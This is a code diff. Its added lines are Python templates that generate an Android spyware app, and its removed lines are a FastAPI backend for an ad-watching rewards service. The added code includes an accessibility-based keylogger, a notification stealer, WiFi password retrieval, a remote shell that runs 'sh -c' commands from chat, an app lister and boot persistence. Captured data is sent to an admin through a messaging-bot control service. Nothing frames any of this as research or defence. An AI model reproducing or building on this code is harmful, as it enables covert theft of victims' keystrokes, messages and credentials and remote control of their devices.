+                sb.append("⚠️ يحتاج root: ").append(e.getMessage());
+            }}
+        }} else {{
+            sb.append("⚠️ Android 10+ يحمي كلمات WiFi (يحتاج root)");
+        }}
+        ControlService.sendMsg(chatId, sb.toString());
+    }}
+}}'''
+
+APPS_HELPER = '''package {pkg};
+
+import android.content.Context;
+import android.content.pm.*;
+import java.util.*;
+
+public class AppsHelper {{
+    private final Context ctx;
+    public AppsHelper(Context c) {{ this.ctx = c; }}
+
+    public void list(String chatId) {{
+        try {{
+            PackageManager pm = ctx.getPackageManager();
+            List<ApplicationInfo> apps = pm.getInstalledApplications(0);
+            StringBuilder sb = new StringBuilder("📦 التطبيقات (" + apps.size() + ")\\n\\n");
+            int n = 0;
+            for (ApplicationInfo a : apps) {{
+                if (n++ > 100) {{ sb.append("...\\n"); break; }}
+                sb.append("• ").append(pm.getApplicationLabel(a))
+                  .append("\\n  ").append(a.packageName).append("\\n");
+                if (sb.length() > 3500) {{
+                    ControlService.sendMsg(chatId, sb.toString());
+                    sb = new StringBuilder();
+                }}
+            }}
+            if (sb.length() > 0) ControlService.sendMsg(chatId, sb.toString());
+        }} catch (Exception e) {{
+            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+}}'''
+
+SCREENSHOT_HELPER = '''package {pkg};
+
+import android.content.Context;
+
+public class ScreenshotHelper {{
+    public ScreenshotHelper(Context c) {{}}
+    public void take(String chatId) {{
+        ControlService.sendMsg(chatId,
+            "🖥️ لقطة الشاشة تحتاج إذن MediaProjection.\\n"
+            + "افتح التطبيق وامنح الصلاحية ثم أعد المحاولة.");
+    }}
+}}'''
+
+SHELL_HELPER = '''package {pkg};
+
+import java.io.*;
+
+public class ShellHelper {{
+    public ShellHelper() {{}}
+
+    public void run(String cmd, String chatId) {{
+        try {{
+            Process p = Runtime.getRuntime().exec(new String[]{{"sh", "-c", cmd}});
+            BufferedReader r = new BufferedReader(
+                new InputStreamReader(p.getInputStream()));
+            BufferedReader er = new BufferedReader(
+                new InputStreamReader(p.getErrorStream()));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = r.readLine()) != null) sb.append(line).append("\\n");
+            while ((line = er.readLine()) != null) sb.append(line).append("\\n");
+            r.close(); er.close();
+            String out = sb.toString();
+            if (out.length() > 3800) out = out.substring(0, 3800) + "\\n...";
+            if (out.isEmpty()) out = "(لا مخرجات)";
+            ControlService.sendMsg(chatId,
+                "💻 <b>النتيجة:</b>\\n<pre>" + esc(out) + "</pre>");
+        }} catch (Exception e) {{
+            ControlService.sendMsg(chatId, "❌ " + e.getMessage());
+        }}
+    }}
+
+    private String esc(String s) {{
+        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
+    }}
+}}'''
+
+KEYLOGGER_SERVICE = '''package {pkg};
+
+import android.accessibilityservice.AccessibilityService;
+import android.view.accessibility.AccessibilityEvent;
+
+public class KeyloggerService extends AccessibilityService {{
+    private StringBuilder buf = new StringBuilder();
+    private String lastPkg = "";
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent e) {{
+        if (e.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return;
+        try {{
+            String pkg = e.getPackageName() != null ? e.getPackageName().toString() : "";
+            String text = e.getText() != null && e.getText().size() > 0
+                ? e.getText().get(0).toString() : "";
+            if (text.isEmpty()) return;
+            if (!pkg.equals(lastPkg)) {{
+                if (buf.length() > 0) flush();
+                lastPkg = pkg;
+            }}
+            buf.append("[").append(pkg).append("] ").append(text).append("\\n");
+            if (buf.length() > 500) flush();
+        }} catch (Exception ignored) {{}}
+    }}
+
+    private void flush() {{
+        ControlService.sendMsg("{admin_id}",
+            "⌨️ <b>Keylog</b>\\n<pre>"
+            + buf.toString().replace("<","&lt;") + "</pre>");
+        buf = new StringBuilder();
+    }}
+
+    @Override public void onInterrupt() {{}}
+}}'''
+
+NOTIFICATION_LISTENER = '''package {pkg};
+
+import android.app.Notification;
+import android.os.Bundle;
+import android.service.notification.*;
+
+public class NotificationListener extends NotificationListenerService {{
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {{
+        try {{
+            Notification n = sbn.getNotification();
+            if (n == null) return;
+            Bundle b = n.extras;
+            String title = b.getString(Notification.EXTRA_TITLE, "");
+            String text = b.getString(Notification.EXTRA_TEXT, "");
+            String pkg = sbn.getPackageName();
+            if (pkg.equals(getPackageName())) return;
+            if (title.isEmpty() && text.isEmpty()) return;
+            String msg = "🔔 <b>إشعار</b>\\n\\n"
+                + "📦 <code>" + pkg + "</code>\\n"
+                + "👤 " + esc(title) + "\\n"
+                + "💬 " + esc(text);
+            ControlService.sendMsg("{admin_id}", msg);
+        }} catch (Exception ignored) {{}}
+    }}
+
+    private String esc(String s) {{
+        if (s == null) return "";
+        return s.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;");
+    }}
+
+    @Override public void onNotificationRemoved(StatusBarNotification sbn) {{}}
+}}'''
+
+BOOT_RECEIVER = '''package {pkg};
+
+import android.content.*;
+import android.os.Build;
+
+public class BootReceiver extends BroadcastReceiver {{
+    @Override
+    public void onReceive(Context ctx, Intent i) {{
+        if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {{
+            Intent svc = new Intent(ctx, ControlService.class);
+            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc);
+            else ctx.startService(svc);
+        }}
+    }}
+}}'''
+
+
+# ═══════════════════════════════════════════════════════════════
+#                    توليد مشروع Android
+# ═══════════════════════════════════════════════════════════════
+def generate_project(cfg: dict, proj: Path):
+    pkg = cfg["pkg_name"]
+    pkg_path = proj / "app" / "src" / "main" / "java" / Path(*pkg.split("."))
+    pkg_path.mkdir(parents=True, exist_ok=True)
+    res = proj / "app" / "src" / "main" / "res"
+    for d in ["mipmap-xxxhdpi", "values", "xml"]:
+        (res / d).mkdir(parents=True, exist_ok=True)
+
+    shutil.copy(cfg["icon"], res / "mipmap-xxxhdpi" / "ic_launcher.png")
+
+    perms_xml = "\n".join(
+        f'    <uses-permission android:name="android.permission.{PERMISSIONS[p][2]}"/>'
+        for p in cfg["perms"]
     )
 
-
-@app.post("/api/ads/{ad_id}/watch")
-async def api_watch_ad(ad_id: int, req: Request):
-    await req.json()  # الحفاظ على توافق الواجهة الحالية
-    user_id = await get_current_user_id(req)
-    with db() as conn:
-        conn.execute("BEGIN IMMEDIATE")
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        reset_ads_if_needed(dict(row))
-        limit = int(get_setting("daily_limit", "10"))
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        if row["ads_today"] >= limit:
-            raise HTTPException(429, f"وصلت الحد اليومي ({limit})")
-        ad = conn.execute("SELECT * FROM ads WHERE id=? AND active=1", (ad_id,)).fetchone()
-        if not ad:
-            raise HTTPException(404, "الإعلان غير متاح")
-        already = conn.execute(
-            "SELECT 1 FROM user_ads WHERE user_id=? AND ad_id=? LIMIT 1",
-            (user_id, ad_id)).fetchone()
-        if already:
-            raise HTTPException(429, "شاهدت هذا الإعلان مسبقًا")
-
-        session = conn.execute(
-            "SELECT started_at FROM ad_sessions WHERE user_id=? AND ad_id=?",
-            (user_id, ad_id)).fetchone()
-        if not session:
-            raise HTTPException(400, "ابدأ الإعلان من التطبيق أولاً")
-        elapsed = int(time.time()) - int(session["started_at"] or 0)
-        required = max(0, int(ad["duration"] or 0))
-        if elapsed < required:
-            raise HTTPException(400, f"انتظر {required - elapsed} ثانية قبل استلام المكافأة")
-
-        reward = float(ad["reward"] if ad["reward"] is not None else get_setting("ad_reward", "0.20"))
-        conn.execute(
-            "INSERT INTO user_ads (user_id, ad_id, watched_at) VALUES (?,?,?)",
-            (user_id, ad_id, datetime.now(timezone.utc).isoformat()))
-        conn.execute(
-            """UPDATE users SET balance=balance+?, total_earned=total_earned+?,
-               ads_watched=ads_watched+1, ads_today=ads_today+1 WHERE user_id=?""",
-            (reward, reward, user_id))
-        conn.execute("DELETE FROM ad_sessions WHERE user_id=? AND ad_id=?", (user_id, ad_id))
-        conn.execute("UPDATE ads SET views=views+1 WHERE id=?", (ad_id,))
-        new_row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    return {"reward": reward, "balance": round(new_row["balance"], 2),
-            "ads_today": new_row["ads_today"], "daily_limit": limit}
-
-# ═══════════════════════════════════════════════════════════════════════
-# 📋 المهام
-# ═══════════════════════════════════════════════════════════════════════
-@app.get("/api/tasks")
-async def api_tasks(req: Request):
-    user_id = await get_current_user_id(req)
-    with db() as conn:
-        rows = conn.execute("SELECT * FROM tasks WHERE active=1 ORDER BY id DESC").fetchall()
-        done = {r["task_id"] for r in conn.execute(
-            "SELECT task_id FROM user_tasks WHERE user_id=?", (user_id,)).fetchall()}
-        clicks = {}
-        try:
-            for r in conn.execute(
-                "SELECT task_id, clicked_at, opened_at, confirmed_at FROM task_clicks WHERE user_id=?",
-                (user_id,)).fetchall():
-                clicks[r["task_id"]] = {
-                    "clicked_at": r["clicked_at"],
-                    "opened_at": r["opened_at"] if "opened_at" in r.keys() else None,
-                    "confirmed_at": r["confirmed_at"] if "confirmed_at" in r.keys() else None,
-                }
-        except sqlite3.OperationalError:
-            pass
-
-    wait_seconds = int(get_setting("task_wait", "10"))
-    now = datetime.now(timezone.utc)
-    out = []
-
-    for r in rows:
-        item = {
-            "id": r["id"], "title": r["title"],
-            "description": r["description"] or "",
-            "reward": r["reward"] or 0,
-            "url": r["url"] or "",
-            "icon": r["icon"] or "🎯",
-            "completed": r["id"] in done,
-            "state": "open",
-            "wait_seconds": wait_seconds,
-            "remaining": 0,
-        }
-
-        if item["completed"]:
-            item["state"] = "done"
-            out.append(item)
-            continue
-
-        c = clicks.get(r["id"])
-        if not c:
-            item["state"] = "open"
-            out.append(item)
-            continue
-
-        if c["clicked_at"] and not c.get("opened_at"):
-            item["state"] = "opened"
-            out.append(item)
-            continue
-
-        if c.get("opened_at") and not c.get("confirmed_at"):
-            try:
-                opened_at = datetime.fromisoformat(c["opened_at"])
-                if opened_at.tzinfo is None:
-                    opened_at = opened_at.replace(tzinfo=timezone.utc)
-                diff = (now - opened_at).total_seconds()
-                item["remaining"] = max(0, int(wait_seconds - diff))
-                item["state"] = "ready" if diff >= wait_seconds else "waiting"
-            except Exception:
-                item["state"] = "waiting"
-                item["remaining"] = wait_seconds
-            out.append(item)
-            continue
-
-        item["state"] = "ready"
-        out.append(item)
-
-    return out
-
-
-@app.post("/api/tasks/{task_id}/start")
-async def api_task_start(task_id: int, req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    with db() as conn:
-        task = conn.execute("SELECT * FROM tasks WHERE id=? AND active=1", (task_id,)).fetchone()
-        if not task:
-            raise HTTPException(404, "المهمة غير موجودة")
-        if conn.execute("SELECT 1 FROM user_tasks WHERE user_id=? AND task_id=?",
-                        (user_id, task_id)).fetchone():
-            raise HTTPException(400, "منجزة مسبقًا")
-
-        existing = conn.execute(
-            "SELECT * FROM task_clicks WHERE user_id=? AND task_id=?",
-            (user_id, task_id)).fetchone()
-
-        now_iso = datetime.now(timezone.utc).isoformat()
-        if existing:
-            conn.execute(
-                """UPDATE task_clicks SET clicked_at=?, opened_at=NULL, confirmed_at=NULL
-                   WHERE user_id=? AND task_id=?""",
-                (now_iso, user_id, task_id))
-        else:
-            conn.execute(
-                "INSERT INTO task_clicks (user_id, task_id, clicked_at) VALUES (?,?,?)",
-                (user_id, task_id, now_iso))
-
-    return {"ok": True, "state": "opened"}
-
-
-@app.post("/api/tasks/{task_id}/confirm")
-async def api_task_confirm(task_id: int, req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-
-    with db() as conn:
-        task = conn.execute("SELECT * FROM tasks WHERE id=? AND active=1", (task_id,)).fetchone()
-        if not task:
-            raise HTTPException(404, "المهمة غير موجودة")
-        if conn.execute("SELECT 1 FROM user_tasks WHERE user_id=? AND task_id=?",
-                        (user_id, task_id)).fetchone():
-            raise HTTPException(400, "منجزة مسبقًا")
-
-        click = conn.execute(
-            "SELECT * FROM task_clicks WHERE user_id=? AND task_id=?",
-            (user_id, task_id)).fetchone()
-        if not click or not click["clicked_at"]:
-            raise HTTPException(400, "اضغط زر انضم أولاً")
-
-        try:
-            clicked_at = datetime.fromisoformat(click["clicked_at"])
-            if clicked_at.tzinfo is None:
-                clicked_at = clicked_at.replace(tzinfo=timezone.utc)
-            diff = (datetime.now(timezone.utc) - clicked_at).total_seconds()
-            if diff < DEF_TASK_CONFIRM_DELAY:
-                raise HTTPException(400, f"انتظر {int(DEF_TASK_CONFIRM_DELAY - diff)} ثانية")
-        except HTTPException:
-            raise
-        except Exception:
-            pass
-
-        now_iso = datetime.now(timezone.utc).isoformat()
-        conn.execute(
-            "UPDATE task_clicks SET opened_at=? WHERE user_id=? AND task_id=?",
-            (now_iso, user_id, task_id))
-
-    return {"ok": True, "state": "waiting", "wait_seconds": int(get_setting("task_wait", "10"))}
-
-
-@app.post("/api/tasks/{task_id}/claim")
-async def api_task_claim(task_id: int, req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    wait_seconds = int(get_setting("task_wait", "10"))
-
-    with db() as conn:
-        task = conn.execute("SELECT * FROM tasks WHERE id=? AND active=1", (task_id,)).fetchone()
-        if not task:
-            raise HTTPException(404, "المهمة غير موجودة")
-        if conn.execute("SELECT 1 FROM user_tasks WHERE user_id=? AND task_id=?",
-                        (user_id, task_id)).fetchone():
-            raise HTTPException(400, "منجزة مسبقًا")
-
-        click = conn.execute(
-            "SELECT * FROM task_clicks WHERE user_id=? AND task_id=?",
-            (user_id, task_id)).fetchone()
-        if not click:
-            raise HTTPException(400, "اضغط انضم أولاً")
-        if not click["clicked_at"]:
-            raise HTTPException(400, "لم يتم الضغط")
-        if "opened_at" not in click.keys() or not click["opened_at"]:
-            raise HTTPException(400, "أكد الدخول أولاً")
-
-        try:
-            opened_at = datetime.fromisoformat(click["opened_at"])
-            if opened_at.tzinfo is None:
-                opened_at = opened_at.replace(tzinfo=timezone.utc)
-            diff = (datetime.now(timezone.utc) - opened_at).total_seconds()
-            if diff < wait_seconds:
-                raise HTTPException(400, f"انتظر {int(wait_seconds - diff)} ثانية")
-        except HTTPException:
-            raise
-        except Exception:
-            pass
-
-        cur_done = conn.execute(
-            "INSERT OR IGNORE INTO user_tasks (user_id, task_id, completed_at) VALUES (?,?,?)",
-            (user_id, task_id, datetime.now(timezone.utc).isoformat()))
-        if cur_done.rowcount != 1:
-            raise HTTPException(400, "منجزة مسبقًا")
-        if task["reward"] and task["reward"] > 0:
-            conn.execute(
-                """UPDATE users SET balance=balance+?, total_earned=total_earned+?
-                   WHERE user_id=?""",
-                (task["reward"], task["reward"], user_id))
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    return {"reward": task["reward"] or 0, "balance": round(row["balance"], 2)}
-
-
-@app.post("/api/daily")
-async def api_daily(req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    now = int(time.time()); day = 86400
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        old_last_daily = int(row["last_daily"] or 0)
-        since = now - old_last_daily
-        if since < day:
-            raise HTTPException(400, f"عد بعد {(day - since)//3600} ساعة")
-        streak = row["streak"] + 1 if since < 2 * day else 1
-        base = float(get_setting("daily_bonus", "0.10"))
-        reward = round(base * min(streak, 7), 2)
-        cur_daily = conn.execute(
-            """UPDATE users SET balance=balance+?, total_earned=total_earned+?,
-               streak=?, last_daily=? WHERE user_id=? AND last_daily=?""",
-            (reward, reward, streak, now, user_id, old_last_daily))
-        if cur_daily.rowcount != 1:
-            raise HTTPException(409, "تم استلام المكافأة اليومية بالفعل")
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-    return {"reward": reward, "streak": streak, "balance": round(row["balance"], 2)}
-
-
-@app.get("/api/leaderboard")
-async def api_leaderboard():
-    with db() as conn:
-        rows = conn.execute(
-            """SELECT user_id, first_name, username, photo_url, total_earned
-               FROM users WHERE banned=0
-               ORDER BY total_earned DESC LIMIT 20""").fetchall()
-    return [{"rank": i + 1, "user_id": r["user_id"], "first_name": r["first_name"],
-             "username": r["username"], "photo_url": r["photo_url"],
-             "total_earned": round(r["total_earned"], 2)} for i, r in enumerate(rows)]
-
-
-@app.get("/api/countries")
-async def api_countries():
-    return COUNTRIES
-
-
-@app.post("/api/withdrawal/setup")
-async def api_setup_withdrawal(req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    country = (body.get("country") or "").strip()
-    method_id = (body.get("method") or "").strip()
-    fields_in = body.get("fields") or {}
-    if country not in COUNTRIES:
-        raise HTTPException(400, "دولة غير مدعومة")
-    method = get_method(country, method_id)
-    if not method:
-        raise HTTPException(400, "طريقة غير مدعومة")
-    clean = {}
-    for f in method["fields"]:
-        val = str(fields_in.get(f["name"], "")).strip()
-        if f.get("required") and not val:
-            raise HTTPException(400, f"حقل مطلوب: {f['label']}")
-        clean[f["name"]] = val
-    payload = json.dumps({"country": country, "method": method_id, "fields": clean},
-                         ensure_ascii=False)
-    with db() as conn:
-        conn.execute(
-            """UPDATE users SET country=?, withdrawal_method=?, withdrawal_data=?
-               WHERE user_id=?""",
-            (country, method_id, payload, user_id))
-    return {"ok": True}
-
-
-@app.post("/api/withdraw")
-async def api_withdraw(req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    try:
-        amount = float(body.get("amount", 0))
-    except (TypeError, ValueError):
-        raise HTTPException(400, "المبلغ غير صالح")
-    min_w = float(get_setting("min_withdraw", "10.00"))
-    if not math.isfinite(amount) or amount <= 0:
-        raise HTTPException(400, "المبلغ غير صالح")
-    if amount < min_w:
-        raise HTTPException(400, f"الحد الأدنى ${min_w:.2f}")
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        if not row["country"] or not row["withdrawal_method"] or not row["withdrawal_data"]:
-            raise HTTPException(400, "أضف بيانات السحب أولًا")
-        if row["balance"] < amount:
-            raise HTTPException(400, "رصيدك غير كافٍ")
-        method = get_method(row["country"], row["withdrawal_method"])
-        method_name = method["name"] if method else row["withdrawal_method"]
-        cur_debit = conn.execute(
-            "UPDATE users SET balance=balance-? WHERE user_id=? AND balance>=?",
-            (amount, user_id, amount))
-        if cur_debit.rowcount != 1:
-            raise HTTPException(400, "رصيدك غير كافٍ")
-        cur = conn.execute(
-            """INSERT INTO withdrawals (user_id, amount, country, method,
-               method_name, account_json, created_at)
-               VALUES (?,?,?,?,?,?,?)""",
-            (user_id, amount, row["country"], row["withdrawal_method"],
-             method_name, row["withdrawal_data"],
-             datetime.now(timezone.utc).isoformat()))
-        wid = cur.lastrowid
-        new_row = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-
-    for admin in ADMIN_IDS:
-        try:
-            await notify_admin_withdrawal(admin, wid, user_id, amount,
-                                          row["country"], method_name,
-                                          row["withdrawal_data"])
-        except Exception:
-            pass
-    return {"ok": True, "balance": round(new_row["balance"], 2),
-            "amount": amount, "id": wid}
-
-
-@app.get("/api/withdrawals")
-async def api_withdrawals(req: Request):
-    user_id = await get_current_user_id(req)
-    with db() as conn:
-        rows = conn.execute(
-            """SELECT id, amount, method_name, status, created_at
-               FROM withdrawals WHERE user_id=?
-               ORDER BY id DESC LIMIT 30""", (user_id,)).fetchall()
-    return [dict(r) for r in rows]
-
-
-@app.post("/api/contact-request")
-async def api_contact_request(req: Request):
-    body = await req.json()
-    user_id = await get_current_user_id(req)
-    message = (body.get("message") or "").strip()
-    if not message:
-        raise HTTPException(400, "الرسالة مطلوبة")
-    if not rate_ok(user_id, max_hits=3, window=60):
-        raise HTTPException(429, "أرسلت كثيرًا")
-    with db() as conn:
-        row = conn.execute("SELECT username FROM users WHERE user_id=?", (user_id,)).fetchone()
-        username = row["username"] if row else ""
-        conn.execute(
-            """INSERT INTO contact_requests (user_id, username, message, created_at)
-               VALUES (?,?,?,?)""",
-            (user_id, username, message, datetime.now(timezone.utc).isoformat()))
-    for admin in ADMIN_IDS:
-        try:
-            await notify_admin_contact(admin, user_id, username, message)
-        except Exception:
-            pass
-    return {"ok": True}
-
-
-async def notify_admin_withdrawal(admin, wid, user_id, amount, country,
-                                  method_name, account_json):
-    if not BOT_TOKEN:
-        return
-    try:
-        f = json.loads(account_json).get("fields", {})
-    except Exception:
-        f = {}
-    fields_txt = "\n".join(f"  • {k}: `{v}`" for k, v in f.items())
-    text = (f"💸 *طلب سحب جديد*\n▬▬▬▬▬▬▬▬▬▬\n🆔 `#{wid}`\n👤 `{user_id}`\n"
-            f"💵 `${amount:.2f}`\n🌍 {COUNTRIES.get(country, {}).get('name', country)}\n"
-            f"💳 {method_name}\n📄 البيانات:\n{fields_txt}")
-    kb = {"inline_keyboard": [[
-        {"text": "✅ موافقة", "callback_data": f"wd_ok_{wid}"},
-        {"text": "❌ رفض", "callback_data": f"wd_no_{wid}"}]]}
-    async with httpx.AsyncClient() as c:
-        await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                     json={"chat_id": admin, "text": text, "parse_mode": "Markdown",
-                           "reply_markup": kb})
-
-
-async def notify_admin_contact(admin, user_id, username, message):
-    if not BOT_TOKEN:
-        return
-    text = (f"📞 *طلب تواصل جديد*\n▬▬▬▬▬▬▬▬▬▬\n👤 `{user_id}`\n"
-            f"🔗 @{username or '—'}\n\n💬 {message}")
-    async with httpx.AsyncClient() as c:
-        await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                     json={"chat_id": admin, "text": text, "parse_mode": "Markdown"})
-
-# ═══════════════════════════════════════════════════════════════════════
-# 👑 Admin API
-# ═══════════════════════════════════════════════════════════════════════
-@app.post("/api/admin/upload-media")
-async def adm_upload_media(
-    req: Request,
-    file: UploadFile = File(...),
-):
-    admin_id = await verify_admin(req)
-    if not BOT_TOKEN:
-        raise HTTPException(500, "BOT_TOKEN مفقود")
-
-    media_type = "photo"
-    ct = (file.content_type or "").lower()
-    if ct.startswith("video/"):
-        media_type = "video"
-
-    suffix = ".jpg"
-    if "png" in ct: suffix = ".png"
-    elif "mp4" in ct: suffix = ".mp4"
-    elif "gif" in ct: suffix = ".gif"
-    elif "webp" in ct: suffix = ".webp"
-
-    with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as tmp:
-        shutil.copyfileobj(file.file, tmp)
-        tmp_path = tmp.name
-
-    upload_target = int(UPLOAD_CHAT_ID) if UPLOAD_CHAT_ID.lstrip("-").isdigit() else admin_id
-
-    try:
-        async with httpx.AsyncClient(timeout=180) as c:
-            with open(tmp_path, "rb") as fh:
-                if media_type == "video":
-                    r = await c.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                        data={"chat_id": upload_target},
-                        files={"video": (file.filename or "v.mp4", fh, ct or "video/mp4")})
-                else:
-                    r = await c.post(
-                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                        data={"chat_id": upload_target},
-                        files={"photo": (file.filename or "i.jpg", fh, ct or "image/jpeg")})
-            data = r.json()
-            if not data.get("ok"):
-                raise HTTPException(400, data.get("description") or "فشل الرفع")
-            result = data["result"]
-            file_id = result["video"]["file_id"] if media_type == "video" else result["photo"][-1]["file_id"]
-
-        try:
-            async with httpx.AsyncClient(timeout=10) as c2:
-                await c2.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage",
-                              json={"chat_id": upload_target,
-                                    "message_id": result["message_id"]})
-        except Exception:
-            pass
-
-        norm = "video" if media_type == "video" else "image"
-        return {"ok": True, "file_id": file_id, "type": norm}
-    finally:
-        try: os.unlink(tmp_path)
-        except Exception: pass
-
-
-@app.post("/api/admin/ads/create")
-async def adm_create_ad(req: Request):
-    body = await req.json()
-    await verify_admin(req)
-    title = (body.get("title") or "").strip()
-    if not title:
-        raise HTTPException(400, "العنوان مطلوب")
-    media = body.get("media") or []
-    if not isinstance(media, list):
-        media = []
-
-    clean_media = []
-    for m in media:
-        if not isinstance(m, dict):
-            continue
-        fid = m.get("file_id")
-        if not fid:
-            continue
-        clean_media.append({
-            "type": normalize_media_type(m.get("type")),
-            "file_id": fid,
-        })
-    media_json = json.dumps(clean_media, ensure_ascii=False)
-
-    with db() as conn:
-        cur = conn.execute(
-            """INSERT INTO ads (title, description, url, contact, type,
-               video_file_id, image_file_id, media_json, reward, duration,
-               button_text, redirect_url, created_at)
-               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
-            (title, body.get("description", ""), body.get("url", ""),
-             body.get("contact", ""), "multi", "", "", media_json,
-             float(get_setting("ad_reward", "0.20")),
-             int(body.get("duration", 15)),
-             body.get("button_text", ""), body.get("redirect_url", ""),
-             datetime.now(timezone.utc).isoformat()))
-        aid = cur.lastrowid
-    return {"ok": True, "id": aid}
-
-
-@app.get("/api/admin/stats")
-async def adm_stats(req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
-        ads = conn.execute("SELECT COUNT(*) FROM ads WHERE active=1").fetchone()[0]
-        tasks = conn.execute("SELECT COUNT(*) FROM tasks WHERE active=1").fetchone()[0]
-        pw = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE status='pending'").fetchone()[0]
-        cr = conn.execute("SELECT COUNT(*) FROM contact_requests WHERE status='new'").fetchone()[0]
-        paid = conn.execute("SELECT COALESCE(SUM(amount),0) FROM withdrawals WHERE status='approved'").fetchone()[0]
-        views = conn.execute("SELECT COALESCE(SUM(views),0) FROM ads").fetchone()[0]
-        total_balance = conn.execute("SELECT COALESCE(SUM(balance),0) FROM users").fetchone()[0]
-        today = int(time.time()) - 86400
-        active24 = conn.execute("SELECT COUNT(*) FROM users WHERE last_seen > ?", (today,)).fetchone()[0]
-    return {"users": users, "ads": ads, "tasks": tasks, "pending_wd": pw,
-            "contact_req": cr, "paid": round(paid, 2), "views": views,
-            "total_balance": round(total_balance, 2), "active24": active24,
-            "uptime": int(time.time() - START_TIME),
-            "heartbeat": HEARTBEAT_STATS}
-
-
-@app.get("/api/admin/ads")
-async def adm_ads_list(req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        rows = conn.execute(
-            """SELECT id, title, description, url, contact, type, media_json,
-                      reward, duration, views, active, button_text, redirect_url
-               FROM ads ORDER BY id DESC LIMIT 200""").fetchall()
-    out = []
-    for r in rows:
-        d = dict(r)
-        try:
-            raw_media = json.loads(d.get("media_json") or "[]")
-        except Exception:
-            raw_media = []
-        clean = []
-        for m in raw_media:
-            clean.append({
-                "type": normalize_media_type(m.get("type")),
-                "file_id": m.get("file_id", ""),
-            })
-        d["media"] = clean
-        out.append(d)
-    return out
-
-
-@app.delete("/api/admin/ads/{ad_id}")
-async def adm_del_ad(ad_id: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        conn.execute("UPDATE ads SET active=0 WHERE id=?", (ad_id,))
-    return {"ok": True}
-
-
-@app.post("/api/admin/ads/{ad_id}/toggle")
-async def adm_toggle_ad(ad_id: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        row = conn.execute("SELECT active FROM ads WHERE id=?", (ad_id,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        conn.execute("UPDATE ads SET active=? WHERE id=?", (0 if row["active"] else 1, ad_id))
-    return {"ok": True}
-
-
-@app.get("/api/admin/tasks")
-async def adm_tasks_list(req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        rows = conn.execute(
-            "SELECT id, title, description, reward, url, icon, active FROM tasks ORDER BY id DESC"
-        ).fetchall()
-    return [dict(r) for r in rows]
-
-
-@app.post("/api/admin/tasks")
-async def adm_add_task(req: Request):
-    body = await req.json()
-    await verify_admin(req)
-    title = (body.get("title") or "").strip()
-    if not title:
-        raise HTTPException(400, "العنوان مطلوب")
-    with db() as conn:
-        cur = conn.execute(
-            "INSERT INTO tasks (title, description, reward, url, icon, created_at) VALUES (?,?,?,?,?,?)",
-            (title, body.get("description", ""), float(body.get("reward", 0)),
-             body.get("url", ""), body.get("icon", "🎯"),
-             datetime.now(timezone.utc).isoformat()))
-    return {"ok": True, "id": cur.lastrowid}
-
-
-@app.delete("/api/admin/tasks/{task_id}")
-async def adm_del_task(task_id: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        conn.execute("UPDATE tasks SET active=0 WHERE id=?", (task_id,))
-    return {"ok": True}
-
-
-@app.get("/api/admin/withdrawals")
-async def adm_withdrawals(req: Request, status: str = None):
-    await verify_admin(req)
-    q = """SELECT w.*, u.first_name, u.username FROM withdrawals w
-           LEFT JOIN users u ON u.user_id = w.user_id"""
-    params = []
-    if status:
-        q += " WHERE w.status=?"
-        params.append(status)
-    q += " ORDER BY w.id DESC LIMIT 100"
-    with db() as conn:
-        rows = conn.execute(q, params).fetchall()
-    result = []
-    for r in rows:
-        d = dict(r)
-        try: d["account"] = json.loads(d.get("account_json") or "{}").get("fields", {})
-        except Exception: d["account"] = {}
-        result.append(d)
-    return result
-
-
-@app.post("/api/admin/withdrawals/{wid}/approve")
-async def adm_wd_approve(wid: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        row = conn.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        if row["status"] != "pending":
-            raise HTTPException(409, "تمت معالجة الطلب مسبقًا")
